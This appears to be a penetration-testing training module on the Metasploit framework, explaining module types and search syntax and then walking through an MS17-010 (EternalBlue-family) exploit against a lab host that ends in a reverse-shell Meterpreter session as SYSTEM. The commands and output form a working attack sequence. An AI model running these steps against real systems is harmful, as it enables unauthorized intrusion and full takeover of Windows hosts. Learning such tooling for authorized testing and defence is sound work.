<h3>Modules</h3>

As we mentioned previously, Metasploit modules are prepared scripts with a specific purpose and corresponding functions that have already been developed and tested in the wild. The exploit category consists of so-called proof-of-concept (POCs) that can be used to exploit existing vulnerabilities in a largely automated manner. Many people often think that the failure of the exploit disproves the existence of the suspected vulnerability. However, this is only proof that the Metasploit exploit does not work and not that the vulnerability does not exist. This is because many exploits require customization according to the target hosts to make the exploit work. Therefore, automated tools such as the Metasploit framework should only be considered a support tool and not a substitute for our manual skills.

Once we are in the msfconsole, we can select from an extensive list containing all the available Metasploit modules. Each of them is structured into folders, which will look like this:

<h3>Syntax</h3>

<No.> <type>/<os>/<service>/<name>

<h3>Example</h3>

794   exploit/windows/ftp/scriptftp_list

<h3>Index No.</h3>

The No. tag will be displayed to select the exploit we want afterward during our searches. We will see how helpful the No. tag can be to select specific Metasploit modules later.

<h3>Type</h3>

The Type tag is the first level of segregation between the Metasploit modules. Looking at this field, we can tell what the piece of code for this module will accomplish. Some of these types are not directly usable as an exploit module would be, for example. However, they are set to introduce the structure alongside the interactable ones for better modularization. To explain better, here are the possible types that could appear in this field:

Type	Description

Auxiliary	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.

Encoders	Ensure that payloads are intact to their destination.

Exploits	Defined as modules that exploit a vulnerability that will allow for the payload delivery.

NOPs	(No Operation code) Keep the payload sizes consistent across exploit attempts.

Payloads	Code runs remotely and calls back to the attacker machine to establish a connection (or shell).

Plugins	Additional scripts can be integrated within an assessment with msfconsole and coexist.

Post	Wide array of modules to gather information, pivot deeper, etc.

Note that when selecting a module to use for payload delivery, the use <no.> command can only be used with the following modules that can be used as initiators (or interactable modules):

Type	Description

Auxiliary	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.

Exploits	Defined as modules that exploit a vulnerability that will allow for the payload delivery.

Post	Wide array of modules to gather information, pivot deeper, etc.

<h3>OS</h3>

The OS tag specifies which operating system and architecture the module was created for. Naturally, different operating systems require different code to be run to get the desired results.

<h3>Service</h3>

The Service tag refers to the vulnerable service that is running on the target machine. For some modules, such as the auxiliary or post ones, this tag can refer to a more general activity such as gather, referring to the gathering of credentials, for example.

<h3>Name</h3>

Finally, the Name tag explains the actual action that can be performed using this module created for a specific purpose.

<h3>Searching for Modules</h3>

Metasploit also offers a well-developed search function for the existing modules. With the help of this function, we can quickly search through all the modules using specific tags to find a suitable one for our target.

<h3>MSF - Search Function</h3>

msf6 > help search

For example, we can try to find the EternalRomance exploit for older Windows operating systems. This could look something like this:

<h3>MSF - Searching for EternalRomance</h3>

msf6 > search eternalromance

msf6 > search eternalromance type:exploit

We can also make our search a bit more coarse and reduce it to one category of services. For example, for the CVE, we could specify the year (cve:<year>), the platform Windows (platform:<os>), the type of module we want to find (type:<auxiliary/exploit/post>), the reliability rank (rank:<rank>), and the search name (<pattern>). This would reduce our results to only those that match all of the above.

<h3>MSF - Specific Search</h3>

msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

<h3>Module Selection</h3>

To select our first module, we first need to find one. Let's suppose that we have a target running a version of SMB vulnerable to EternalRomance (MS17_010) exploits. We have found that SMB server port 445 is open upon scanning the target.

@htb[/htb]$ nmap -sV 10.10.10.40

We would boot up msfconsole and search for this exact exploit name.

<h3>MSF - Search for MS17_010</h3>

msf6 > search ms17_010

Next, we want to select the appropriate module for this scenario. From the Nmap scan, we have detected the SMB service running on version Microsoft Windows 7 - 10. With some additional OS scanning, we can guess that this is a Windows 7 running a vulnerable instance of SMB. We then proceed to select the module with the index no. 2 to test if the target is vulnerable.

<h3>Using Modules</h3>

Within the interactive modules, there are several options that we can specify. These are used to adapt the Metasploit module to the given environment. Because in most cases, we always need to scan or attack different IP addresses. Therefore, we require this kind of functionality to allow us to set our targets and fine-tune them. To check which options are needed to be set before the exploit can be sent to the target host, we can use the show options command. Everything required to be set before the exploitation can occur will have a Yes under the Required column.

<h3>MSF - Select Module</h3>

<img width="1037" height="872" alt="image" src="https://github.com/user-attachments/assets/92ed0a1b-0297-4f76-9157-e2cdc58fbb77" />

Here we see how helpful the No. tags can be. Because now, we do not have to type the whole path but only the number assigned to the Metasploit module in our search. We can use the command info after selecting the module if we want to know something more about the module. This will give us a series of information that can be important for us.

<h3>MSF - Module Information</h3>

msf6 exploit(windows/smb/ms17_010_psexec) > info

After we are satisfied that the selected module is the right one for our purpose, we need to set some specifications to customize the module to use it successfully against our target host, such as setting the target (RHOST or RHOSTS).

<h3>MSF - Target Specification</h3>

  Modules
  
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40

msf6 exploit(windows/smb/ms17_010_psexec) > options

In addition, there is the option setg, which specifies options selected by us as permanent until the program is restarted. Therefore, if we are working on a particular target host, we can use this command to set the IP address once and not change it again until we change our focus to a different IP address.

<h3>MSF - Permanent Target Specification</h3>

msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40

Finally, since we are about to use a TCP-based reverse shell (/windows/meterpreter/reverse_tcp) we need to specify to which IP address it needs to connect to in order to establish a connection. Therefore, we need to set LHOST to our own IP address like following:

<h3>MSF - LHOST Specification</h3>

msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15

LHOSTS => 10.10.14.15

Once everything is set and ready to go, we can proceed to launch the attack. Note that the payload was not set here, as the default one is sufficient for this demonstration.

<h3>MSF - Exploit Execution</h3>

msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check


meterpreter> shell

C:\Windows\system32>

We now have a shell on the target machine, and we can interact with it.

<h3>MSF - Target Interaction</h3>

C:\Windows\system32> whoami

whoami

nt authority\system

This has been a quick and dirty example of how msfconsole can help out quickly but serves as an excellent example of how the framework works. Only one module was needed without any payload selection, encoding or pivoting between sessions or jobs.

